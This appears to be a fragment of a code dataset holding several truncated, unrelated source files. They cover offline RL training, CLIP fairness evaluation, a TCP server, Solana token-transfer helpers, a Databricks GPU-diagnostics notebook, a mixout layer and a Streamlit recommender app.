self.active_connections.remove(websocket)\n        if client_id in self.browser:\n            await self.browser[client_id].close()\n            self.browser.pop(client_id, None)\n            self.page.pop(client_id, None)\n            self.done.pop(client_id, None)\n            self.executing.pop(client_id, None)\n            self.queue.pop(client_id, Non",
    "import os\nimport time\n\nimport numpy as np\nfrom pprint import pprint\n\nimport numpy as np\nimport distrax\n\nimport tqdm\nimport jax\nimport jax.numpy as jnp\nimport flax\nfrom flax import linen as nn\nfrom flax.training import train_state, checkpoints\nimport optax\nfrom ml_collections import config_flags\n\nimport gym\nimport gymnasium\nimport d4rl\n\nimport absl.app\nfrom absl import flags\n\nfrom ..agents.conservative_sac import ConservativeSAC\nfrom ..agents.iql import IQLLearner, get_iql_policy_from_model\nfrom ..agents.rlpd import get_rlpd_policy_from_model\nfrom ..agents.dagger_based_learner import DAggerBasedLearner\nfrom ..utils.env_utils import GymnasiumWrapper\nfrom ..models.model import RandomSamplerPolicy, TanhGaussianPolicy, FullyConnectedQFunction, get_policy_from_model, load_model\nfrom ..utils.utils import define_flags_with_default, set_random_seed, get_user_flags, WandBLogger\n\nFLAGS = flags.FLAGS\n\nFLAGS_DEF = define_flags_with_default(\n            dense_env='pen-human-v1',\n            sparse_env='AdroitHandPenSparse-v1',\n            dataset_dir='',\n            expert_dir='./intervene/bc_output/grace_bc_adroit_d4rl_policies/994fb9e340c94a2aa94a9685bb64b3ae/model.pkl',\n            seed=24,\n            task_reward=False,\n\n            pretrain_n_epochs=1,\n            pretrain_n_train_step_per_epoch=200,\n\n            n_iters=10,\n            n_epochs=1,\n            n_train_step_per_epoch=200,\n            max_traj_length=200,\n            collect_n_trajs=5,\n            batch_size=256,\n            rl_reward_multiplier=1,\n            eval_n_trajs=1,\n\n            intervention_rate=0,\n            intervention_strategy='',\n            ground_truth_agent_dir='./intervene/grace_iql_expert_adroit/0542bcee61f74bd783c58ef86ed01316/model.pkl',\n            intervene_threshold=0.0,\n            intervene_n_steps=4,\n            compare_optimal=True,\n            intervene_temperature=0.0,\n\n            policy_weight_decay=0.0,\n            iql_bc_loss_weight=0,\n            iql_expectile=0.9,\n            iql_temperature=0.1,\n            iql_log_stds=0.0,\n\n            rlpd_offline_ratio=0.5,\n            rlpd_utd_ratio=1,\n            binary_include_bc=True,\n\n            cql=ConservativeSAC.get_default_config(),\n\n            train_type='rl',\n            dataset_type='rl',\n            save_dataset=False,\n            logging=WandBLogger.get_default_config(),\n)\n\n\ndef main(argv):\n\n    variant = get_user_flags(FLAGS, FLAGS_DEF)\n    wandb_logger = WandBLogger(config=FLAGS.logging, variant=variant)\n    set_random_seed(FLAGS.seed)\n    \n    # load env\n    sample_env = gym.make(FLAGS.dense_env).unwrapped\n    eval_env = GymnasiumWrapper(gymnasium.make(FLAGS.sparse_env).unwrapped)\n\n\n \n    if FLAGS.train_type != 'bc':\n        behavior_agent = IQLLearner(FLAGS.seed,\n                                    sample_env.observation_space.sample()[np.newaxis],\n                                    sample_env.action_space.sample()[np.newaxis],\n                                    expectile=FLAGS.iql_expectile,\n                                    temperature=FLAGS.iql_temperature,\n                                    policy_weight_decay=FLAGS.policy_weight_decay,\n                                    log_stds=FLAGS.iql_log_stds,\n                                    opt_decay_schedule='',\n                                    )\n    else:\n        observation_dim = sample_env.observation_space.shape[0]\n        action_dim = sample_env.action_space.shape[0]\n        policy = TanhGaussianPolicy(observation_dim, action_dim)\n        qf = FullyConnectedQFunction(observation_dim, action_dim)\n        behavior_agent = ConservativeSAC(FLAGS.cql, policy, qf)\n    \n    # load expert policy\n    expert_model_pkl_dir = FLAGS.expert_dir\n    if expert_model_pkl_dir == '':\n        # completely random policy\n        intervene_policy = RandomSamplerPolicy(sample_env)\n        intervene_agent = None\n    elif 'iql' in expert_model_pkl_dir:\n        saved_ckpt_expert = load_model(expert_model_pkl_dir)\n        intervene_policy = get_iql_policy_from_model(eval_env, saved_ckpt_expert)\n        intervene_agent = saved_ckpt_expert['iql']\n        intervene_agent_type = 'iql'\n    elif 'rlpd' in expert_model_pkl_dir:\n        saved_ckpt_expert = load_model(expert_model_pkl_dir)\n        intervene_policy = get_rlpd_policy_from_model(eval_env, saved_ckpt_expert)\n        intervene_agent = saved_ckpt_expert['rlpd']\n        intervene_agent_type = 'rlpd'\n    else:\n        saved_ckpt_expert = load_model(expert_model_pkl_dir)\n        intervene_policy = get_policy_from_model(eval_env, saved_ckpt_expert)\n        intervene_agent = saved_ckpt_expert['sac']\n        intervene_agent_type = 'sac'\n    \n    if FLAGS.ground_truth_agent_dir != '':\n        if 'iql' in FLAGS.ground_truth_agent_dir:\n            ground_truth_agent = load_model(FLAGS.ground_truth_agent_dir)['iql']\n            ground_truth_agent_type = 'iql'\n        elif 'sac' in FLAGS.ground_truth_agent_dir or 'bc' in FLAGS.ground_truth_agent_dir:\n            ground_truth_age",
    "from collections import defaultdict\nfrom contextlib import suppress\n\nfrom .wds_eval import *\nfrom .wilds_eval import *\n\n# Dollar Street\n\n# import ipdb\n\nclass TopKAccuracy(Accuracy):\n    def __init__(self, prediction_fn=None, name=None):\n        if name is None:\n            name = \"acc_topk\"\n        super().__init__(name=name)\n\n    def _compute_element_wise(self, y_pred, y_true):\n        if self.prediction_fn is not None:\n            y_pred = self.prediction_fn(y_pred)\n        return (y_pred == y_true.unsqueeze(-1)).any(-1).float()\n\n\nclass DollarStreetEvaluator(WILDSEvaluator):\n    def __init__(self, metadata):\n        super().__init__(metadata)\n        self._metadata_fields = [\"income_ds\", \"income_meta\", \"region\"]\n        self._eval_grouper = CombinatorialGrouper(\n            dataset=self, groupby_fields=[\"income_ds\"]\n        )\n\n    def eval(self, y_pred, y_true, metadata, prediction_fn=None):\n        metric = TopKAccuracy(prediction_fn=prediction_fn, name=\"acc_top5\")\n        return self.standard_group_eval(\n            metric, self._eval_grouper, y_pred, y_true, metadata\n        )\n\n\nEVALUATORS[\"fairness/dollar_street\"] = DollarStreetEvaluator\n\n\ndef evaluate_dollar_street_dataset(\n    task,\n    model_arch,\n    model_path,\n    data_root=None,\n    dataset_len=None,\n    batch_size=64,\n    num_workers=4,\n):\n    \"\"\"Evaluate CLIP model on Dollar Street classification task.\"\"\"\n\n    # Evaluate\n    metrics, y_pred, y_target = evaluate_webdataset(\n        task.replace(\"fairness/\", \"\"),\n        model_arch,\n        model_path,\n        data_root,\n        dataset_len,\n        batch_size,\n        num_workers,\n        return_preds=True,\n        return_topk=5,\n    )\n\n    # Load additional metadata\n    print(\"Reading additional metadata\")\n    metadata_loader = create_metadata_loader(\n        task.replace(\"fairness/\", \"\"), data_root, dataset_len, batch_size, num_workers\n    )\n    # Check metadata\n    y_array = []\n    metadata_array = []\n    for label, metadata in metadata_loader:\n        y_array.append(label)\n        metadata_array.append(metadata)\n    # assert (y_target == np.array(y_array)).all(), \"Labels do not match\"\n    metadata = torch.cat(metadata_array)\n\n    # Compute additional metrics\n    evaluator = EVALUATORS[task](metadata)\n    metrics.update(evaluator.eval(y_pred, y_target, metadata)[0])\n\n    return metrics\n\n\n# GeoDE\n\n\nclass GeoDEEvaluator(WILDSEvaluator):\n    def __init__(self, metadata):\n        super().__init__(metadata)\n        self._metadata_fields = [\"region\", \"country\"]\n        self._eval_grouper = CombinatorialGrouper(\n            dataset=self, groupby_fields=[\"region\"]\n        )\n\n    def eval(self, y_pred, y_true, metadata, prediction_fn=None):\n        metric = Accuracy(prediction_fn=prediction_fn)\n        return self.standard_group_eval(\n            metric, self._eval_grouper, y_pred, y_true, metadata\n        )\n\n\nEVALUATORS[\"fairness/geode\"] = GeoDEEvaluator\n\n\ndef evaluate_geode_dataset(\n    task,\n    model_arch,\n    model_path,\n    data_root=None,\n    dataset_len=None,\n    batch_size=64,\n    num_workers=4,\n):\n    \"\"\"Evaluate CLIP model on GeoDE classification task.\"\"\"\n\n    # Evaluate\n    metrics, y_pred, y_target = evaluate_webdataset(\n        task.replace(\"fairness/\", \"\"),\n        model_arch,\n        model_path,\n        data_root,\n        dataset_len,\n        batch_size,\n        num_workers,\n        return_preds=True,\n    )\n\n    # Load additional metadata\n    print(\"Reading additional metadata\")\n    metadata_loader = create_metadata_loader(\n        task.replace(\"fairness/\", \"\"), data_root, dataset_len, batch_size, num_workers\n    )\n    # Check metadata\n    y_array = []\n    metadata_array = []\n    for label, metadata in metadata_loader:\n        y_array.append(label)\n        metadata_array.append(metadata)\n    # assert (y_target == np.array(y_array)).all(), \"Labels do not match\"\n    metadata = torch.cat(metadata_array)\n\n    # Compute additional metrics\n    evaluator = EVALUATORS[task](metadata)\n    metrics.update(evaluator.eval(y_pred, y_target, metadata)[0])\n\n    return metrics\n\n\n# FairFace\n\nFF_PRED_LABELS = [\"race\", \"gender\", \"age\", \"toxic\"]\n\n\nclass FairFaceEvaluator(WILDSEvaluator):\n    def __init__(self, metadata):\n        super().__init__(metadata)\n        self._metadata_fields = [\"age\", \"gender\", \"race\", \"race_binary\"]\n        self._first_eval_grouper = CombinatorialGrouper(\n            dataset=self, groupby_fields=[\"race_binary\"]\n        )\n        self._second_eval_grouper = CombinatorialGrouper(\n            dataset=self, groupby_fields=[\"gender\", \"race\"]\n        )\n        self._third_eval_grouper = CombinatorialGrouper(\n            dataset=self, groupby_fields=[\"race\"]\n        )\n\n    def eval(self, y_pred, _, metadata):\n        metrics = {}\n        # Table 3, 4: Classify race, gender, age; group by white vs non-white\n        metric = Accuracy(name=f\"acc_race\")\n        metrics.update(\n            self.standard_group_eval(\n                metric,\n                self._first_eval_grouper,\n        ",
    "import socket\r\nimport select\r\nimport pickle\r\nimport time\r\n\r\n# IP address and port for the server\r\nserver_ip = socket.gethostbyname(socket.gethostname())\r\nport = 8888\r\n\r\n# Print server details\r\nprint('Server IP is ' + server_ip + '\\nPort ' + str(port) + ' is being used')\r\nprint('Press ctrl + c to exit out of the program\\n')\r\n\r\n# Create a TCP socket\r\ntcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ntcp_server_socket.setblocking(0)\r\n\r\n# Bind the socket to the server address and port\r\ntry:\r\n    tcp_server_socket.bind((server_ip, port))\r\n    is_connected = True\r\nexcept OSError:\r\n    print('Port ' + str(port) + ' is busy')\r\n    exit()\r\n\r\n# Listen for incoming connections\r\ntcp_server_socket.listen(100)\r\n\r\n# Lists to keep track of inputs, outputs, and clients\r\ninputs = [tcp_server_socket]\r\noutputs = []\r\n\r\n#This is the list of Clients. We Need to Maintain this here!\r\nclients = []\r\n# History of all actions taken by the clients\r\nhistory = []\r\n\r\n# Dictionary to keep track of clients and their requests\r\nclient_request_dict = {}\r\n\r\n# Function to write the serialized clients to a file\r\ndef write_clients_to_file(serialized_clients, file_name):\r\n    with open(file_name, 'wb') as file:\r\n        file.write(serialized_clients)\r\n\r\n# Main server loop\r\nwhile True:\r\n    # Start receiving data from the client\r\n    # print('Ready to serve...\\nCurrent inputs')\r\n    # print(client_request_dict)\r\n\r\n   # Extract the client addresses from the client sockets\r\n    # client_addresses = [sock.getpeername()[0] for sock in client_request_dict.keys()]   \r\n\r\n    # Serialize the list of client addresses\r\n    serialized_clients = pickle.dumps(clients)\r\n\r\n    # print('\\n')\r\n    # Write the serialized clients to a file\r\n    write_clients_to_file(serialized_clients, \"clients_list.txt\")\r\n    # print(serialized_clients)\r\n    # print(\"The list of clients has been successfully written to clients_list.txt\")\r\n\r\n    # Use select to monitor sockets for readable, writable, or exceptional conditions\r\n    readable, writable, exceptional = select.select(inputs, outputs, inputs)\r\n\r\n    # Handle sockets with incoming data\r\n    for sock in readable:\r\n        if sock is tcp_server_socket:\r\n            print('Server looking for a request')\r\n            # Accept incoming connection\r\n            client_socket, addr = tcp_server_socket.accept()\r\n            client_socket.setblocking(0)\r\n            inputs.append(client_socket)\r\n            # Adds the new socket to the dict with an empty list that acts a queue\r\n            client_request_dict.update({client_socket: []})\r\n            # print('Received a connection from:', addr)\r\n        else:\r\n            # Receive message from client\r\n            print(\"Incoming message from \" + str(sock))\r\n            message = sock.recv(50000)\r\n            print(message)\r\n            if message:\r\n                stored_client_list = client_request_dict.get(sock)\r\n                stored_client_list.append(message)\r\n                client_request_dict[sock] = stored_client_list\r\n                if sock not in outputs:\r\n                    outputs.append(sock)\r\n                print('Got Message')       \r\n            else:\r\n                # Close the socket if no message is received\r\n                if sock in outputs:\r\n                    outputs.remove(sock)\r\n                inputs.remove(sock)\r\n                sock.close()\r\n                del client_request_dict[sock]\r\n\r\n    # Handle sockets with pending messages to send\r\n    for sock in writable:\r\n        if sock in client_request_dict.keys():\r\n            print('Completing request for ' + str(sock) + '\\n')\r\n            stored_client_list = client_request_dict.get(sock)\r\n            if len(stored_client_list) <= 0:\r\n                inputs.remove(sock)\r\n                outputs.remove(sock)\r\n                del client_request_dict[sock]\r\n                sock.close()\r\n                continue\r\n            message = stored_client_list[0]\r\n            stored_client_list = stored_client_list[1:]\r\n            client_request_dict[sock] = stored_client_list\r\n            # Handle special messages from client\r\n            if 'hello:' in message.decode('utf-8'):\r\n                print('Printing the message')\r\n                print(message)\r\n                message = message.decode('utf-8')\r\n                tokens = message.split(':')\r\n                hostname = tokens[1]\r\n                hostIP = tokens[2]\r\n                pair = (hostname, hostIP)\r\n                hist_message = time.strftime(\"%H:%M:%S\", time.localtime()) + ' : ' + hostname + ' with IP ' + hostIP + ' joined'\r\n                history.append(hist_message)\r\n                print(pair)\r\n                if pair not in clients:\r\n                    clients.append(pair)\r\n                print(clients)\r\n                sock.sendall(b'DONE')\r\n            elif 'updatehistory:' in message.decode('utf-8'):\r\n                message = message.decode('utf-8')\r\n                tokens = message.split(':')\r\n               ",
    "#!/usr/bin/python\n# =============================================================================\n#\n#  ######     ###    ########  ##    ##  ######   #######  ##       \n# ##    ##   ## ##   ##     ##  ##  ##  ##    ## ##     ## ##       \n# ##        ##   ##  ##     ##   ####   ##       ##     ## ##       \n#  ######  ##     ## ########     ##     ######  ##     ## ##       \n#       ## ######### ##           ##          ## ##     ## ##       \n# ##    ## ##     ## ##           ##    ##    ## ##     ## ##       \n#  ######  ##     ## ##           ##     ######   #######  ########\n#\n# =============================================================================\n#\n# SuperArmor's Python Solana library.\n# (c) SuperArmor\n#\n# module: instructions\n#\n# =============================================================================\n# \nfrom   solana.rpc.api         import Client, Pubkey, Keypair\nfrom   solana.transaction     import Instruction\nfrom   solders.system_program import transfer\nfrom   solders.compute_budget import set_compute_unit_limit, set_compute_unit_price\nfrom   spl.token.constants    import WRAPPED_SOL_MINT as NATIVE_MINT, TOKEN_PROGRAM_ID\nfrom   spl.token.instructions import get_associated_token_address, create_associated_token_account, close_account, sync_native, CloseAccountParams, SyncNativeParams\nimport spl.token.instructions as     splToken\nfrom   typing                 import List, Any, TypedDict, Union, Optional, NamedTuple\nfrom  .helpers                import MakePubkey, MakeKeypair, SapysolPubkey\nfrom  .token_cache            import TokenCacheEntry, TokenCache\n\n# ===============================================================================\n# Creating ATA takes 138 bytes per instruction.\n# If the same sender address is used, each next transfer takes 74 bytes per instruction.\n# But also may vary, because it depends.\n#\nclass AtaInstruction(NamedTuple):\n    pubkey: Pubkey\n    ix:     Instruction = None\n\ndef GetAta(tokenMint: SapysolPubkey, owner: SapysolPubkey) -> Pubkey:\n    return get_associated_token_address(owner=MakePubkey(owner), mint=MakePubkey(tokenMint))\n\ndef CreateAtaIx(tokenMint: SapysolPubkey, owner: SapysolPubkey, payer: SapysolPubkey) -> Pubkey:\n    return create_associated_token_account(payer=MakePubkey(payer), owner=MakePubkey(owner), mint=MakePubkey(tokenMint))\n\ndef GetOrCreateAtaIx(connection: Client,\n                     tokenMint:  SapysolPubkey,\n                     owner:      SapysolPubkey,\n                     payer:      SapysolPubkey = None,\n                     allowOwnerOffCurve: bool = True) -> AtaInstruction:\n\n    if allowOwnerOffCurve == False and not owner.is_on_curve():\n        raise(\"GetOrCreateATAInstruction(): allowOwnerOffCurve = False, but `owner` is off curve address!\")\n\n    ataAddress = GetAta(owner=owner, tokenMint=tokenMint)\n    account    = connection.get_account_info(ataAddress)\n    return AtaInstruction(pubkey = ataAddress,\n                          ix     = None if account.value is not None else CreateAtaIx(payer=payer if payer else owner, owner=owner, tokenMint=tokenMint))\n\n# ===============================================================================\n# `transfer` is deprecated, using `transfer_checked`.\n# Transfering SPL tokens takes 114 bytes per instruction.\n# If the same sender address is used, each next transfer takes 50 bytes per instruction.\n# But also may vary, because it depends.\n#\ndef GetTransferTokenIxInternal(tokenProgramID: SapysolPubkey,\n                               tokenMint:      SapysolPubkey,\n                               decimals:       int,\n                               senderWallet:   SapysolPubkey,\n                               senderAta:      SapysolPubkey,\n                               receiverAta:    SapysolPubkey,\n                               amountLamports: int) -> Instruction:\n    return splToken.transfer_checked(\n        splToken.TransferCheckedParams(\n            program_id = MakePubkey(tokenProgramID),\n            source     = MakePubkey(senderAta),\n            mint       = MakePubkey(tokenMint),\n            dest       = MakePubkey(receiverAta),\n            owner      = MakePubkey(senderWallet),\n            amount     = amountLamports,\n            decimals   = decimals,\n            signers    = [MakePubkey(senderWallet)],\n        )\n    )\n\n# ===============================================================================\n#\ndef GetTransferTokenIx(connection:       Client,\n                       tokenMint:        SapysolPubkey,\n                       senderWallet:     SapysolPubkey,\n                       receiverWallet:   SapysolPubkey,\n                       amount:           int,\n                       amountIsLamports: bool = True,\n                       allowCreateAta:   bool = True) -> List[Instruction]:\n    result: List[Instruction] = []\n    if allowCreateAta:\n        ataIx: AtaInstruction = GetOrCreateAtaIx(connection = connection,\n                                                tokenMint  = tokenMint,\n     ",
    "# Databricks notebook source\nimport sys\n\n# the python virtual env executable that notebooks create\nspark.conf.set(\"sglang.python.executable\", str(sys.executable))\n# the python virtual env executable that notebooks create\nport = \"30000\"\n# vllm port\nspark.conf.set(\"sglang.port\", port)\n\n# COMMAND ----------\n\n# MAGIC %scala\n# MAGIC  \n# MAGIC import scala.concurrent.duration._\n# MAGIC import sys.process._\n# MAGIC import java.net.Socket\n# MAGIC import scala.util.Success\n# MAGIC import scala.io.Source\n# MAGIC import scala.util.{Using}\n# MAGIC\n# MAGIC val pythonExecutable: String = spark.conf.get(\"sglang.python.executable\")\n# MAGIC\n# MAGIC def runBash(cmd: String): Unit = {\n# MAGIC   val res = sc.runOnEachExecutor(() => {\n# MAGIC     val cmdResult = Seq(\"bash\", \"-c\", cmd).!!\n# MAGIC     cmdResult\n# MAGIC   }, 500.seconds)\n# MAGIC\n# MAGIC   res.foreach { case (index, output) =>\n# MAGIC     println(s\"Node: $index\")\n# MAGIC     output match {\n# MAGIC       case Success(outputString) => println(outputString)\n# MAGIC       case _ => println(\"Command execution failed\")\n# MAGIC     }\n# MAGIC   }\n# MAGIC }\n# MAGIC\n# MAGIC def showSglangLogs(): Unit = {\n# MAGIC   runBash(\"tail output.log || echo 'File does not exist'\")\n# MAGIC }\n# MAGIC\n# MAGIC // convenience for listing python processes for debugging\n# MAGIC def findAllPythonProcs(): Unit = {\n# MAGIC   runBash(\"ps aux | grep python\")\n# MAGIC }\n# MAGIC\n# MAGIC // convenience for listing python processes for debugging\n# MAGIC def findAllVEnvPythonProcs(): Unit = {\n# MAGIC   runBash(s\"ps aux | grep '$pythonExecutable'\")\n# MAGIC }\n# MAGIC\n# MAGIC def nvidiaSMI(): Unit = {\n# MAGIC   runBash(\"nvidia-smi\")\n# MAGIC }\n# MAGIC\n\n# COMMAND ----------\n\n# MAGIC %scala\n# MAGIC nvidiaSMI\n\n# COMMAND ----------\n\n# MAGIC %scala \n# MAGIC showSglangLogs\n\n# COMMAND ----------\n\n# MAGIC %scala\n# MAGIC findAllPythonProcs\n\n# COMMAND ----------\n\n\n",
    "\"\"\" Auswertung Dummy f\u00fcr die Apps \"\"\"\n\n# Importieren der ben\u00f6tigten Funktionen aus der Funktionen-Bibliothek\nfrom funktionen import awtrix3_send_app\n\n\ndef auswertung(app, data, config):\n    \"\"\"Dummy Auswertung\"\"\"\n    data_app = {\n        \"text\": (\n            \"Soweit so gut! Jetzt bitte eure 'Apps' in der 'config.ini' definieren, eine \"\n            \"Auswertung dazu erstellen (Datei muss 'AppName.py' hei\u00dfen) und im Ordner 'Auswertungen' \"\n            \"speichern. Templates speziell zum Einsatz mit 'Solaranzeige' findet ihr im Ordner \"\n            \"Auswertungen/Templates  ....... \"\n            \"Have Fun! ( um dieses Dummy zu deaktivieren, einfach 'dummy.py' aus dem \"\n            \"Ordner Auswertungen entfernen/l\u00f6schen und/oder in der 'config.ini' deaktivieren! ) \"\n        ),\n        #\"icon\": \"HILFE\",\n        #\"pushIcon\": 2,\n        \"rainbow\": bool(1),\n    }\n    awtrix3_send_app(\n        config[\"awtrix3\"][\"url\"],\n        app,\n        data_app,\n        config[\"settings\"][\"app_scroll_duration\"],\n        config[\"settings\"][\"app_show_time\"],\n    )\n",
    "# codes are from Implementation of mixout from https://arxiv.org/abs/1909.11299\nimport math\nimport torch\nimport torch.nn as nn\nimport torch.nn.init as init\nimport torch.nn.functional as F\n\nfrom torch.nn import Parameter\nfrom torch.autograd.function import InplaceFunction\n\n\nclass Mixout(InplaceFunction):\n    # target: a weight tensor mixes with a input tensor\n    # A forward method returns\n    # [(1 - Bernoulli(1 - p) mask) * target + (Bernoulli(1 - p) mask) * input - p * target]/(1 - p)\n    # where p is a mix probability of mixout.\n    # A backward returns the gradient of the forward method.\n    # Dropout is equivalent to the case of target=None.\n    # I modified the code of dropout in PyTorch.\n    @staticmethod\n    def _make_noise(input):\n        return input.new().resize_as_(input)\n\n    @classmethod\n    def forward(cls, ctx, input, target=None, p=0.0, training=False, inplace=False):\n        if p < 0 or p > 1:\n            raise ValueError(\"A mix probability of mixout has to be between 0 and 1,\" \" but got {}\".format(p))\n        if target is not None and input.size() != target.size():\n            raise ValueError(\n                \"A target tensor size must match with a input tensor size {},\"\n                \" but got {}\".format(input.size(), target.size())\n            )\n        ctx.p = p\n        ctx.training = training\n\n        if ctx.p == 0 or not ctx.training:\n            return input\n\n        if target is None:\n            target = cls._make_noise(input)\n            target.fill_(0)\n        target = target.to(input.device)\n\n        if inplace:\n            ctx.mark_dirty(input)\n            output = input\n        else:\n            output = input.clone()\n\n        ctx.noise = cls._make_noise(input)\n        if len(ctx.noise.size()) == 1:\n            ctx.noise.bernoulli_(1 - ctx.p)\n        else:\n            ctx.noise[0].bernoulli_(1 - ctx.p)\n            ctx.noise = ctx.noise[0].repeat(input.size()[0], 1)\n        ctx.noise.expand_as(input)\n\n        if ctx.p == 1:\n            output = target\n        else:\n            output = ((1 - ctx.noise) * target + ctx.noise * output - ctx.p * target) / (1 - ctx.p)\n        return output\n\n    @staticmethod\n    def backward(ctx, grad_output):\n        if ctx.p > 0 and ctx.training:\n            return grad_output * ctx.noise, None, None, None, None\n        else:\n            return grad_output, None, None, None, None\n\n\ndef mixout(input, target=None, p=0.0, training=False, inplace=False):\n    return Mixout.apply(input, target, p, training, inplace)\n\n\nclass MixLinear(torch.nn.Module):\n    __constants__ = [\"bias\", \"in_features\", \"out_features\"]\n\n    # If target is None, nn.Sequential(nn.Linear(m, n), MixLinear(m', n', p))\n    # is equivalent to nn.Sequential(nn.Linear(m, n), nn.Dropout(p), nn.Linear(m', n')).\n    # If you want to change a dropout layer to a mixout layer,\n    # you should replace nn.Linear right after nn.Dropout(p) with Mixout(p)\n    def __init__(self, in_features, out_features, bias=True, target=None, p=0.0):\n        super(MixLinear, self).__init__()\n        self.in_features = in_features\n        self.out_features = out_features\n        self.weight = Parameter(torch.Tensor(out_features, in_features))\n        if bias:\n            self.bias = Parameter(torch.Tensor(out_features))\n        else:\n            self.register_parameter(\"bias\", None)\n        self.reset_parameters()\n        self.target = target\n        self.p = p\n\n    def reset_parameters(self):\n        init.kaiming_uniform_(self.weight, a=math.sqrt(5))\n        if self.bias is not None:\n            fan_in, _ = init._calculate_fan_in_and_fan_out(self.weight)\n            bound = 1 / math.sqrt(fan_in)\n            init.uniform_(self.bias, -bound, bound)\n\n    def forward(self, input):\n        return F.linear(input, mixout(self.weight, self.target, self.p, self.training), self.bias)\n\n    def extra_repr(self):\n        type = \"drop\" if self.target is None else \"mix\"\n        return \"{}={}, in_features={}, out_features={}, bias={}\".format(\n            type + \"out\", self.p, self.in_features, self.out_features, self.bias is not None\n        )\n",
    "import streamlit as st\r\nimport pandas as pd\r\nimport numpy as np\r\nfrom sklearn.feature_extraction.text import TfidfVectorizer\r\nfrom sklearn.metrics.pairwise import cosine_similarity\r\nfrom sklearn.preprocessing import MinMaxScaler\r\nimport joblib\r\n\r\n# \u00d6rnek veri setleri y\u00fckleme, ger\u00e7ek veri y\u00fcklemek i\u00e7in uygun y\u00f6ntemler kullan\u0131lmal\u0131\r\nnetflix_data = pd.read_csv('netflix.csv')  # Netflix veri seti\r\nspotify_data = pd.read_csv('spotify.csv',encoding=\"ISO-8859-1\" , sep=\",\" )  # Spotify veri seti\r\n\r\n\r\n\r\n\r\n# books_data = pd.read_csv('books.csv')  # Kitap veri seti\r\n\r\n# \u00d6zellikleri ve modelleri y\u00fckleme\r\nspotify_features = spotify_data[\r\n    ['danceability_%', 'energy_%', 'valence_%', 'acousticness_%', 'instrumentalness_%', 'liveness_%', 'speechiness_%']]\r\nscaler = MinMaxScaler()\r\nspotify_normalized_features = scaler.fit_transform(spotify_features)\r\ntfidf_vectorizer_books = TfidfVectorizer()\r\n# # NaN de\u011ferleri bo\u015f string ile de\u011fi\u015ftir\r\n# books_data['Book-Title'] = books_data['Book-Title'].fillna('')\r\n# books_data['Book-Author'] = books_data['Book-Author'].fillna('')\r\n\r\n# \u015eimdi TF-IDF vekt\u00f6rle\u015ftiriciyi uygulayabiliriz\r\n# tfidf_matrix_books = tfidf_vectorizer_books.fit_transform(books_data['Book-Title'] + \" \" + books_data['Book-Author'])\r\n\r\n\r\ndef calculate_mood(feeling_score, activity_score, energy_level, social_interaction):\r\n    total_score = feeling_score + activity_score + energy_level + social_interaction\r\n    if total_score >= 30:\r\n        return \"\u00c7ok Mutlu\"\r\n    elif 20 <= total_score < 30:\r\n        return \"Mutlu\"\r\n    elif 15 <= total_score < 20:\r\n        return \"Keyifli\"\r\n    elif 10 <= total_score < 15:\r\n        return \"Melankolik\"\r\n    else:\r\n        return \"\u00dczg\u00fcn\"\r\n\r\n\r\ndef filter_contents(data, mood):\r\n    if mood == \"\u00c7ok Mutlu\" or mood == \"Mutlu\":\r\n        filtered_data = data[data['listed_in'].str.contains(\"Comedy\") | data['listed_in'].str.contains(\"Animation\")]\r\n    elif mood == \"\u00dczg\u00fcn\":\r\n        filtered_data = data[data['listed_in'].str.contains(\"Drama\") | data['listed_in'].str.contains(\"Romantic\") | data['listed_in'].str.contains(\"Comedy\")]\r\n    elif mood == \"Keyifli\":\r\n        filtered_data = data[data['listed_in'].str.contains(\"Family\") | data['listed_in'].str.contains(\"Documentary\") | data['listed_in'].str.contains(\"Animation\")]\r\n    elif mood == \"Melankolik\":\r\n        filtered_data = data[\r\n            data['listed_in'].str.contains(\"Art House\") | data['listed_in'].str.contains(\"Independent\") | data['listed_in'].str.contains(\"Drama\")]\r\n    return filtered_data.sample(n=min(5, len(filtered_data)))\r\n\r\n\r\ndef recommend_music(spotify_data, features, num_recommendations=5):\r\n    index = np.random.randint(0, len(features))\r\n    cosine_similarities = cosine_similarity(features[index:index + 1], features)\r\n    similar_indices = cosine_similarities.argsort().flatten()[-(num_recommendations + 1):-1]\r\n    return spotify_data.iloc[similar_indices]\r\n\r\n\r\n# def recommend_books(tfidf_matrix, books_data, num_recommendations=5):\r\n#     index = np.random.randint(0, tfidf_matrix.shape[0])\r\n#     cosine_similarities = cosine_similarity(tfidf_matrix[index:index + 1], tfidf_matrix)\r\n#     similar_indices = cosine_similarities.argsort().flatten()[-(num_recommendations + 1):-1]\r\n#     return books_data.iloc[similar_indices]\r\n\r\n\r\nst.set_page_config(page_title=\"MINDMINGLE\", layout=\"wide\", initial_sidebar_state=\"expanded\")\r\nst.markdown(\"\"\"\r\n    <style>\r\n    .big-font {\r\n        font-size:30px !important;\r\n        font-weight: bold;\r\n        text-align: center;\r\n        margin: 20px;\r\n    }\r\n    button {\r\n        background-color: #4CAF50;\r\n        color: white;\r\n        padding: 8px 16px;\r\n        margin: 10px 0;\r\n        border: none;\r\n        cursor: pointer;\r\n        border-radius: 5px;\r\n    }\r\n    button:hover {\r\n        background-color: #45a049;\r\n    }\r\n    </style>\r\n    <div class=\"big-font\">MINDMINGLE</div>\r\n    <p>Merhabalar! Uygulamam\u0131zda g\u00fcnl\u00fck duygu durumlar\u0131n\u0131z\u0131 analiz edebilmek i\u00e7in belirlemi\u015f oldu\u011fumuz  kriterlere  1 ile 10 aras\u0131nda puanlama yapman\u0131z\u0131 bekliyoruz.  Bu ad\u0131mlar sonucunda g\u00fcnl\u00fck mental durumunuzu \u00f6\u011frenebilecek ve uygulamam\u0131zdan film ve m\u00fczik \u00f6nerisi alabileceksiniz. \u00d6nerilerimizi yenilemek  i\u00e7in tavsiye butonuna tekrar t\u0131klaman\u0131z yeterli </p>\r\n    \"\"\", unsafe_allow_html=True)\r\n\r\n\r\nst.sidebar.image(\"logo.png\", use_column_width=True)\r\nst.sidebar.title(\"EUREKA\")\r\n# Sidebar metinleri\r\nst.sidebar.text(\"Aycan Kara\u00e7anta Kurt\")\r\nst.sidebar.text(\"Can Umurhan \u00d6ks\u00fcz\")\r\nst.sidebar.text(\"Kadir Al\u00e7in\")\r\nst.sidebar.text(\"Meryem Tarhan \u00d6zkul\")\r\nst.sidebar.text(\"Yasin Tan\u0131\u015f\")\r\n\r\n# Geri bildirim formu\r\n# st.sidebar.subheader(\"Geri Bildirim\")\r\n# feedback = st.sidebar.text_area(\"Uygulama hakk\u0131ndaki d\u00fc\u015f\u00fcnceleriniz:\")\r\n# if 